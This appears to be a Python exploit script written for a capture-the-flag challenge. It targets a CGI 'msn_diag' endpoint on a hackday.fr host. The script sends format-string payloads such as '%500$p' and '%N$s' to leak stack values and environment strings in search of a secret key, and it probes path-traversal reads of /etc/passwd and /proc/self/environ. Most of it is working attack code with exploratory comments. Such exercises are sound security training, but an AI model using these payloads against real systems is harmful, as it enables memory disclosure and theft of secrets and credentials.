#!/usr/bin/env python3
import urllib.request
import urllib.parse
import struct
import time
import re

BASE = "http://millenium-messenger.hackday.fr:8000"

def send_msg(body_str):
    encoded = urllib.parse.quote(body_str, safe='')
    url = f"{BASE}/cgi-bin/msn_diag?cmd=MSG&body={encoded}"
    try:
        with urllib.request.urlopen(url, timeout=15) as resp:
            return resp.read().decode('latin-1', errors='replace')
    except Exception as e:
        return f"ERROR: {e}"

def send_msg_raw(body_bytes):
    encoded = urllib.parse.quote(body_bytes, safe='')
    url = f"{BASE}/cgi-bin/msn_diag?cmd=MSG&body={encoded}"
    try:
        with urllib.request.urlopen(url, timeout=15) as resp:
            return resp.read()
    except Exception as e:
        return b""

def extract_diag(text):
    idx = text.find('DIAG ')
    if idx >= 0:
        return text[idx+5:].strip()
    return text

def extract_diag_bytes(raw):
    marker = b'DIAG '
    idx = raw.find(marker)
    if idx >= 0:
        return raw[idx+5:].rstrip(b'\r\n')
    return b''

# The challenge states: "The key lives in volatile memory"
# This typically means it's on the heap or stack — it changes each run
# Since CGI spawns a new process per request, BUT the key is "loaded at startup"
# This suggests it might be a persistent server process with the key in memory
#
# Key insight: The format string IS our vulnerability
# Let's try to read env vars - CGI passes env vars, and the key might be in env!

print("=== Try reading env vars area ===")
# In CGI, environment variables are accessible
# QUERY_STRING, SERVER_NAME, etc.
# The format string can't directly access env vars, but they're on the process stack
# Let's try large positional offsets

result = send_msg("%500$p.%501$p.%502$p.%503$p.%504$p.%505$p")
print(f"High stack values: {extract_diag(result)}")

# Try even higher 
for pos in [100, 200, 300, 400, 500, 600, 700, 800]:
    result = send_msg(f"%{pos}$p")
    diag = extract_diag(result)
    # Parse the hex value
    match = re.search(r'0x([0-9a-f]+)', diag)
    if match:
        val = int(match.group(1), 16)
        print(f"pos {pos}: 0x{val:08x}")
    else:
        print(f"pos {pos}: {diag}")

print()
print("=== Search deeper in stack for printable strings ===")
# Try %n$s for higher positions to find env vars
interesting = []
for pos in range(100, 600, 10):
    result = send_msg(f"%{pos}$s")
    diag = extract_diag(result)
    if diag and '(null)' not in diag and len(diag) > 4:
        # Check if it's ASCII printable
        if all(32 <= ord(c) < 127 for c in diag if c not in '\r\n'):
            print(f"  pos {pos}: {repr(diag[:80])}")
            interesting.append((pos, diag))
    time.sleep(0.02)

print()
print("=== Also try to look at environ via QUERY_STRING trick ===")
# CGI env: QUERY_STRING is our input, maybe KEY_FILE or KEY is in env
result_env = send_msg("PATH=%999$s")
print(f"PATH test: {extract_diag(result_env)}")

# Try reading the key file directly via path traversal (just in case)
print()
print("=== Path traversal test ===")
# Maybe there's a 'file' feature hidden in the binary
for path in ["/app/data/msn_epoch.key", "/etc/passwd", "/proc/self/environ", "/proc/1/environ"]:
    r = send_msg(path)
    print(f"  {path}: {extract_diag(r)}")
